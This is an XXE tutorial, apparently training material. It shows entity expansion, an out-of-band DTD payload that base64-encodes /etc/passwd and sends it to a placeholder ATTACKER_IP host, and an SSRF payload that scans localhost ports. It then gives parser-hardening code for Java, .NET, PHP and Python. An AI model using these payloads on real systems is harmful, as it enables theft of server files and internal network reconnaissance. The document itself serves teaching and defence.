# In-Band XXE Exploitation
In-band XXE refers to an XXE vulnerability where the attacker can see the response from the server. This allows for straightforward data exfiltration and exploitation. The attacker can simply send a malicious XML payload to the application, and the server will respond with the extracted data or the result of the attack.
#### XML Entity Expansion

XML Entity Expansion is a technique often used in XXE attacks that involves defining entities within an XML document, which the XML parser then expands. Attackers can abuse this feature by creating recursive or excessively large entities, leading to a Denial of Service (DoS) attack or defining external entities referencing sensitive files or services. This method is central to both in-band and out-of-band XXE, as it allows attackers to inject malicious entities into the XML data. For example:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "This is a test message" >]>
<contact><name>&xxe; &xxe;
</name><email>test@test.com</email><message>test</message></contact>
```

## Out-Of-Band XXE Exploitation
We can  create a DTD file that contains an external entity with a PHP filter to exfiltrate data from the target web application.

Save the sample DTD file below and name it as `sample.dtd`. The payload below will exfiltrate the contents of `/etc/passwd` and send the response back to the attacker-controlled server:

```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```
Then we can send this XML request to get the contents of `/etc/passwd`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```
## Server-Side Request Forgery + XXE
### Internal Network Scanning
Consider a scenario where a vulnerable server hosts another web application internally on a non-standard port. An attacker can exploit an XXE vulnerability that makes the server send a request to its own internal network resource.
```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```


### Avoiding Misconfigurations

Misconfigurations in XML parser settings are a common cause of XXE-related vulnerabilities. Adjusting these settings can significantly reduce the risk of XXE attacks. Below are detailed guidelines and best practices for several popular programming languages and frameworks.

### General Best Practices

1. **Disable External Entities and DTDs**: As a best practice, disable the processing of external entities and DTDs in your XML parsers. Most XXE vulnerabilities arise from malicious DTDs.
2. **Use Less Complex Data Formats**: Where possible, consider using simpler data formats like JSON, which do not allow the specification of external entities.
3. **Allowlisting Input Validation**: Validate all incoming data against a strict schema that defines expected data types and patterns. Exclude or escape XML-specific characters such as <, >, &, ', and ". These characters are crucial in XML syntax and can lead to injection attacks if misused.

### Mitigation Techniques in Popular Languages

**Java**

Use the `DocumentBuilderFactory` and disable DTDs:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
```

**.NET**

Configure XML readers to ignore DTDs and external entities:

```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

**PHP**

Disable loading external entities by libxml:

```php
libxml_disable_entity_loader(true);
```

**Python**

Use `defusedxml` library, which is designed to mitigate XML vulnerabilities:

```python
from defusedxml.ElementTree import parse
et = parse(xml_input)
```

### Regularly Update and Patch

- **Software Updates**: Keep all XML processors and libraries up-to-date. Vendors frequently patch known vulnerabilities.
- **Security Patches**: Regularly apply security patches to web applications and their environments.

### Security Awareness and Code Reviews

- **Conduct Code Reviews**: Regularly review code for security vulnerabilities, especially code that handles XML input and parsing.
- **Promote Security Training**: Ensure developers are aware of secure coding practices, including the risks associated with XML parsing.
